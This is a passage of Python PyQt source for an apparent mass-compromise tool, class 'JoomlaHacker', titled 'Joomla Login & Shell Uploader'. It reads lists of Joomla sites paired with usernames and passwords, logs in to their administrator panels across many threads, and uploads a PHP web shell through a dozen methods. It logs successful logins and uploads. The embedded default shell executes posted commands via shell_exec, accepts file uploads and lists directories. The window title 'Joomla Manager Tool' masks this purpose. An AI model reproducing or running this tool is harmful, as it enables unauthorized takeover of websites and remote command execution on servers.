            selection-background-color: #ff00ff;
        }
        
        QProgressBar {
            border: 2px solid #00ffff;
            border-radius: 5px;
            text-align: center;
            background-color: #000000;
        }
        
        QProgressBar::chunk {
            background-color: #ff00ff;
            width: 10px;
        }
        
        QTabWidget::pane {
            border: 2px solid #ff00ff;
            background-color: #000000;
        }
        
        QTabBar::tab {
            background-color: #000000;
            color: #00ffff;
            border: 1px solid #00ffff;
            border-bottom: none;
            padding: 5px 10px;
            border-top-left-radius: 5px;
            border-top-right-radius: 5px;
        }
        
        QTabBar::tab:selected {
            background-color: #ff00ff;
            color: #000000;
            border: 1px solid #ff00ff;
        }
        
        QComboBox {
            background-color: #101020;
            color: #00ffff;
            border: 1px solid #00ffff;
            border-radius: 3px;
            padding: 3px;
        }
        
        QComboBox QAbstractItemView {
            background-color: #101020;
            color: #00ffff;
            selection-background-color: #ff00ff;
            selection-color: #000000;
        }
        
        QCheckBox {
            color: #00ffff;
            spacing: 5px;
        }
        
        QCheckBox::indicator {
            width: 15px;
            height: 15px;
            border: 1px solid #00ffff;
            background-color: #000000;
        }
        
        QCheckBox::indicator:checked {
            background-color: #ff00ff;
            border: 1px solid #ff00ff;
        }
        
        QRadioButton {
            color: #00ffff;
            spacing: 5px;
        }
        
        QRadioButton::indicator {
            width: 15px;
            height: 15px;
            border: 1px solid #00ffff;
            border-radius: 8px;
            background-color: #000000;
        }
        
        QRadioButton::indicator:checked {
            background-color: #ff00ff;
            border: 1px solid #ff00ff;
        }
        
        QScrollBar:vertical {
            border: 1px solid #00ffff;
            background: #000000;
            width: 15px;
            margin: 15px 0 15px 0;
        }
        
        QScrollBar::handle:vertical {
            background: #ff00ff;
            min-height: 20px;
        }
        
        QScrollBar::add-line:vertical, QScrollBar::sub-line:vertical {
            background: #000000;
            height: 15px;
            subcontrol-position: top;
            subcontrol-origin: margin;
        }
        
        QScrollBar::add-page:vertical, QScrollBar::sub-page:vertical {
            background: #003333;
        }
        
        QHeaderView::section {
            background-color: #000000;
            color: #00ffff;
            border: 1px solid #00ffff;
            padding: 5px;
        }
        
        QTableWidget {
            gridline-color: #00ffff;
            background-color: #000000;
            color: #00ffff;
            border: 1px solid #00ffff;
        }
        
        QTableWidget::item:selected {
            background-color: #ff00ff;
            color: #000000;
        }
        """
        
        app.setStyleSheet(style)

class JoomlaHacker(QMainWindow):
    def __init__(self):
        super().__init__()
        self.setWindowTitle("Joomla Manager Tool")
        self.setGeometry(100, 100, 1200, 800)
        
        # Initialize variables
        self.user_agents = [
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
            "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
            "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36",
            "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.0 Safari/605.1.15"
        ]
        
        self.worker_thread = None
        self.setup_ui()
        
    def setup_ui(self):
        # Central widget
        central_widget = QWidget()
        self.setCentralWidget(central_widget)
        
        # Main layout
        main_layout = QVBoxLayout(central_widget)
        
        # Title
        title_label = QLabel("Joomla Login & Shell Uploader")
        title_font = QFont("Courier New", 16, QFont.Bold)
        title_label.setFont(title_font)
        title_label.setAlignment(Qt.AlignCenter)
        title_label.setStyleSheet("color: #ff00ff; background-color: #000000; padding: 10px; border: 2px solid #00ffff;")
        main_layout.addWidget(title_label)
        
        # Splitter for main content
        splitter = QSplitter(Qt.Horizontal)
        main_layout.addWidget(splitter)
        
        # Left panel for controls
        left_panel = QWidget()
        left_layout = QVBoxLayout(left_panel)
        
        # Target selection
        target_group = QGroupBox("Target Selection")
        target_layout = QVBoxLayout(target_group)
        
        target_file_layout = QHBoxLayout()
        target_file_label = QLabel("Target List:")
        self.target_file_edit = QLineEdit()
        target_file_browse = QPushButton("Browse")
        target_file_browse.clicked.connect(self.browse_file)
        
        target_file_layout.addWidget(target_file_label)
        target_file_layout.addWidget(self.target_file_edit)
        target_file_layout.addWidget(target_file_browse)
        target_layout.addLayout(target_file_layout)
        
        left_layout.addWidget(target_group)
        
        # Upload method selection
        method_group = QGroupBox("Upload Method")
        method_layout = QVBoxLayout(method_group)
        
        self.method_combo = QComboBox()
        self.method_combo.addItems(["Auto Upload", "Component", "Template", "FileManager", "Media Manager", "JCE", "RokPad", "Joomla Update", "AJAX", "Config", "JCE Installer", "ARI Image Slider", "Simple File Upload"])
        method_layout.addWidget(self.method_combo)
        
        left_layout.addWidget(method_group)
        
        # Shell customization
        shell_group = QGroupBox("Shell Customization")
        shell_layout = QVBoxLayout(shell_group)
        
        self.custom_shell_check = QCheckBox("Use Custom PHP Shell")
        self.custom_shell_check.stateChanged.connect(self.toggle_shell_editor)
        shell_layout.addWidget(self.custom_shell_check)
        
        self.shell_editor = QTextEdit()
        self.shell_editor.setPlainText("""<?php
defined('_JEXEC') or die('Restricted access');
error_reporting(0);
@ini_set('display_errors', 0);
echo '<!DOCTYPE html><html><head><title>Web Shell</title>';
echo '<style>body{background:#0a0a12;color:#00ffea;font-family:Consolas,monospace;padding:20px;}';
echo 'pre{background:#1a1a2a;padding:10px;border-radius:5px;}';
echo 'input,textarea,select{background:#1a1a2a;color:#00ffea;border:1px solid #00ffea;padding:5px;margin:5px;}';
echo 'button{background:#ff00ff;color:#0a0a12;border:none;padding:8px 15px;cursor:pointer;font-weight:bold;}';
echo '.success{color:#00ff00;}.error{color:#ff0066;}.warning{color:#ffcc00;}';
echo '</style></head><body>';

echo '<h1>Web Shell</h1>';
echo '<div style="background:#1a1a2a;padding:15px;border-radius:5px;margin-bottom:20px;">';
echo '<pre>'.php_uname().'</pre>';
echo '<p>'.getcwd().'</p>';
echo '<p>PHP '.phpversion().'</p>';
echo '</div>';

// Command execution
echo '<div style="margin-bottom:20px;">';
echo '<h2>Command Execution</h2>';
echo '<form method="post">';
echo '<input type="text" name="cmd" style="width:70%" placeholder="Enter command">';
echo '<button type="submit">Execute</button>';
echo '</form>';

if(isset($_POST['cmd'])){
    echo '<div style="background:#1a1a2a;padding:10px;border-radius:5px;margin-top:10px;">';
    echo '<pre>'.shell_exec($_POST['cmd']).'</pre>';
    echo '</div>';
}
echo '</div>';

// File upload
echo '<div style="margin-bottom:20px;">';
echo '<h2>File Upload</h2>';
echo '<form method="post" enctype="multipart/form-data">';
echo '<input type="file" name="f">';
echo '<button type="submit">Upload</button>';
echo '</form>';

if(isset($_FILES['f']) && $_FILES['f']['name']){
    $target = basename($_FILES['f']['name']);
    if(move_uploaded_file($_FILES['f']['tmp_name'], $target)){
        echo '<p class="success">Upload successful: <a href="'.$target.'" style="color:#00ffea;">'.$target.'</a></p>';
    }else{
        echo '<p class="error">Upload failed</p>';
    }
}
echo '</div>';

// File manager
echo '<div style="margin-bottom:20px;">';
echo '<h2>File Manager</h2>';
echo '<div style="background:#1a1a2a;padding:10px;border-radius:5px;max-height:300px;overflow:auto;">';
$files = scandir('.');
foreach($files as $file){
    if($file == '.' || $file == '..') continue;
    $color = is_dir($file) ? "#ff00ff" : "#00ffea";
    $size = is_dir($file) ? "DIR" : filesize($file)." bytes";
    echo '<div style="padding:3px;"><span style="color:'.$color.';">'.$file.'</span> - '.$size.'</div>';
}
echo '</div>';
echo '</div>';

// PHP info
echo '<div>';
echo '<h2>PHP Information</h2>';
echo '<form method="post">';
echo '<button type="submit" name="phpinfo">Show PHP Info</button>';
echo '</form>';

if(isset($_POST['phpinfo'])){
    ob_start();
    phpinfo();
    $phpinfo = ob_get_contents();
    ob_end_clean();
    echo '<div style="background:#1a1a2a;padding:10px;border-radius:5px;margin-top:10px;overflow:auto;max-height:400px;">';
    echo $phpinfo;
    echo '</div>';
}
echo '</div>';

echo '</body></html>';}
?>""")
        self.shell_editor.setVisible(False)
        shell_layout.addWidget(self.shell_editor)
        
        left_layout.addWidget(shell_group)
        
        # Thread control
        thread_group = QGroupBox("Thread Control")
        thread_layout = QHBoxLayout(thread_group)
        
        thread_label = QLabel("Threads:")
        self.thread_spin = QSpinBox()
        self.thread_spin.setRange(1, 100)
        self.thread_spin.setValue(10)
        
        thread_layout.addWidget(thread_label)
        thread_layout.addWidget(self.thread_spin)
        thread_layout.addStretch()
        
        left_layout.addWidget(thread_group)
        
        # Action buttons
        button_layout = QHBoxLayout()
        
        self.start_button = QPushButton("Start")
        self.start_button.clicked.connect(self.start_process)
        self.start_button.setStyleSheet("background-color: #000000; color: #00ff00; border: 2px solid #00ff00;")
        
        self.stop_button = QPushButton("Stop")
        self.stop_button.clicked.connect(self.stop_process)
        self.stop_button.setEnabled(False)
        self.stop_button.setStyleSheet("background-color: #000000; color: #ff0000; border: 2px solid #ff0000;")
        
        view_results_button = QPushButton("View Results")
        view_results_button.clicked.connect(self.view_results)
        
        clear_logs_button = QPushButton("Clear Logs")
        clear_logs_button.clicked.connect(self.clear_logs)
        
        button_layout.addWidget(self.start_button)
        button_layout.addWidget(self.stop_button)
        button_layout.addWidget(view_results_button)
        button_layout.addWidget(clear_logs_button)
        
        left_layout.addLayout(button_layout)
        
        # Progress
        progress_group = QGroupBox("Progress")
        progress_layout = QVBoxLayout(progress_group)
        
        self.progress_bar = QProgressBar()
        self.progress_bar.setRange(0, 100)
        self.progress_bar.setValue(0)
        
        self.progress_label = QLabel("0/0")
        self.progress_label.setAlignment(Qt.AlignCenter)
        
        progress_layout.addWidget(self.progress_bar)
        progress_layout.addWidget(self.progress_label)
        
        left_layout.addWidget(progress_group)
        
        # Status
        status_group = QGroupBox("Status")
        status_layout = QVBoxLayout(status_group)
        
        self.status_label = QLabel("Ready")
        self.status_label.setAlignment(Qt.AlignCenter)
        
        status_layout.addWidget(self.status_label)
        
        left_layout.addWidget(status_group)
        
        # Summary
        summary_group = QGroupBox("Summary")
        summary_layout = QHBoxLayout(summary_group)
        
        self.login_success_label = QLabel("Login Success: 0")
        self.login_success_label.setStyleSheet("color: #00ff00;")
        
        self.upload_success_label = QLabel("Upload Success: 0")
        self.upload_success_label.setStyleSheet("color: #00ff00;")
        
        self.failed_label = QLabel("Failed: 0")
        self.failed_label.setStyleSheet("color: #ff0000;")
        
        summary_layout.addWidget(self.login_success_label)
        summary_layout.addWidget(self.upload_success_label)
        summary_layout.addWidget(self.failed_label)
        
        left_layout.addWidget(summary_group)
        
        left_layout.addStretch()
        
        # Right panel for logs
        right_panel = QWidget()
        right_layout = QVBoxLayout(right_panel)
        
        log_group = QGroupBox("Logs")
        log_layout = QVBoxLayout(log_group)
        
        self.log_display = QTextEdit()
        self.log_display.setReadOnly(True)
        self.log_display.setStyleSheet("background-color: #101020; color: #00ffff; font-family: 'Courier New';")
        
        log_layout.addWidget(self.log_display)
        
        right_layout.addWidget(log_group)
        
        # Add panels to splitter
        splitter.addWidget(left_panel)
        splitter.addWidget(right_panel)
        splitter.setSizes([400, 800])
        
    def toggle_shell_editor(self, state):
        self.shell_editor.setVisible(state == Qt.Checked)
        
    def browse_file(self):
        file_path, _ = QFileDialog.getOpenFileName(
            self, "Select Target List", "", "Text files (*.txt);;All files (*.*)"
        )
        if file_path:
            self.target_file_edit.setText(file_path)
            
    def log(self, message, tag="info"):
        if tag == "success":
            color = "#00ff00"
        elif tag == "error":
            color = "#ff0000"
        elif tag == "target":
            color = "#ff00ff"
        else:  # info
            color = "#00ffff"
            
        self.log_display.append(f'<font color="{color}">{message}</font>')
        self.log_display.moveCursor(QTextCursor.End)
        
    def update_status(self, message):
        self.status_label.setText(message)
        
    def start_process(self):
        if not self.target_file_edit.text():
            self.log("Please select a target list file", "error")
            return

        if not os.path.exists(self.target_file_edit.text()):
            self.log("Target list file not found", "error")
            return

        # Disable start button, enable stop button
        self.start_button.setEnabled(False)
        self.stop_button.setEnabled(True)
        
        # Clear existing results
        for filename in [LOGIN_SUCCESS, UPLOAD_SUCCESS, FAIL_LOG]:
            try:
                open(filename, 'w').close()
            except:
                pass
        
        # Reset counters
        self.login_success_label.setText("Login Success: 0")
        self.upload_success_label.setText("Upload Success: 0")
        self.failed_label.setText("Failed: 0")
        
        # Read targets
        targets = self.read_targets(self.target_file_edit.text())
        if not targets:
            self.log("No valid targets found", "error")
            self.start_button.setEnabled(True)
            self.stop_button.setEnabled(False)
            return
            
        # Start worker thread
        self.worker_thread = WorkerThread(
            targets, 
            self.user_agents,
            self.method_combo.currentText(),
            self.custom_shell_check.isChecked(),
            self.shell_editor.toPlainText(),
            self.thread_spin.value()
        )
        
        self.worker_thread.update_signal.connect(self.log)
        self.worker_thread.progress_signal.connect(self.update_progress)
        self.worker_thread.finished_signal.connect(self.process_finished)
        self.worker_thread.start()
        
        self.update_status("Processing...")
        
    def stop_process(self):
        if self.worker_thread:
            self.worker_thread.stop()
            self.worker_thread.wait()
            
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.update_status("Stopped")
        
    def process_finished(self):
        self.start_button.setEnabled(True)
        self.stop_button.setEnabled(False)
        self.update_status("Finished")
        
        # Update summary
        try:
            login_success = sum(1 for _ in open(LOGIN_SUCCESS, encoding="utf-8"))
            upload_success = sum(1 for _ in open(UPLOAD_SUCCESS, encoding="utf-8"))
            failed = sum(1 for _ in open(FAIL_LOG, encoding="utf-8"))
            
            self.login_success_label.setText(f"Login Success: {login_success}")
            self.upload_success_label.setText(f"Upload Success: {upload_success}")
            self.failed_label.setText(f"Failed: {failed}")
        except:
            pass
        
    def update_progress(self, current, total):
        progress = int((current / total) * 100) if total > 0 else 0
        self.progress_bar.setValue(progress)
        self.progress_label.setText(f"{current}/{total}")
        
    def clear_logs(self):
        self.log_display.clear()
        
    def view_results(self):
        result_dialog = QMainWindow(self)
        result_dialog.setWindowTitle("Results")
        result_dialog.setGeometry(200, 200, 800, 600)
        
        tab_widget = QTabWidget()
        
        # Login success tab
        login_tab = QWidget()
        login_layout = QVBoxLayout(login_tab)
        login_text = QTextEdit()
        login_text.setReadOnly(True)
        try:
            with open(LOGIN_SUCCESS, 'r', encoding="utf-8") as f:
                login_text.setPlainText(f.read())
        except:
            login_text.setPlainText("No data available")
        login_layout.addWidget(login_text)
        tab_widget.addTab(login_tab, "Login Success")
        
        # Upload success tab
        upload_tab = QWidget()
        upload_layout = QVBoxLayout(upload_tab)
        upload_text = QTextEdit()
        upload_text.setReadOnly(True)
        try:
            with open(UPLOAD_SUCCESS, 'r', encoding="utf-8") as f:
                upload_text.setPlainText(f.read())
        except:
            upload_text.setPlainText("No data available")
        upload_layout.addWidget(upload_text)
        tab_widget.addTab(upload_tab, "Upload Success")
        
        # Failed tab
        failed_tab = QWidget()
        failed_layout = QVBoxLayout(failed_tab)
        failed_text = QTextEdit()
        failed_text.setReadOnly(True)
        try:
            with open(FAIL_LOG, 'r', encoding="utf-8") as f:
                failed_text.setPlainText(f.read())
        except:
            failed_text.setPlainText("No data available")
        failed_layout.addWidget(failed_text)
        tab_widget.addTab(failed_tab, "Failed")
        
        result_dialog.setCentralWidget(tab_widget)
        result_dialog.show()
        
    def read_targets(self, file_path):
        """Read targets from file with improved encoding handling"""
        targets = []
        
        try:
            # Try different encodings to handle various input files
            encodings = ['utf-8', 'latin-1', 'ascii', 'cp1252']
            
            for encoding in encodings:
                try:
                    with open(file_path, 'r', encoding=encoding) as f:
                        for line in f:
                            line = line.strip()
                            if not line or line.startswith('#'):
                                continue
                            
                            # Parse the line
                            if '#' in line:
                                parts = line.split('#', 1)
                                url = parts[0].strip()
                                
                                if '@' in parts[1]:
                                    creds = parts[1].strip().split('@', 1)
                                    username = creds[0].strip()
                                    password = creds[1].strip()
                                    
                                    # Normalize URL
                                    if not url.startswith(('http://', 'https://')):
                                        url = 'http://' + url
                                    
                                    if not url.endswith('/administrator'):
                                        if url.endswith('/'):
                                            url = url[:-1]
                                        url = url + '/administrator'
                                    
                                    base_url = url.replace('/administrator', '')
                                    
                                    targets.append({
                                        'url': url,
                                        'username': username,
                                        'password': password,
                                        'base_url': base_url
                                    })
                    break  # Successfully read the file, exit the loop
                except UnicodeDecodeError:
                    continue  # Try next encoding
            
            return targets
        except Exception as e:
            self.log(f"Error reading targets: {str(e)}", "error")
            return []

def main():
    app = QApplication(sys.argv)
    
    # Apply cyberpunk style
    CyberpunkStyle.apply_style(app)
    
    # Set application font
    font = QFont("Courier New", 10)
    app.setFont(font)
    
    window = JoomlaHacker()
    window.show()
    
    sys.exit(app.exec_())

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("Process interrupted by user")
    except Exception as e:
        print(f"Fatal error: {str(e)}")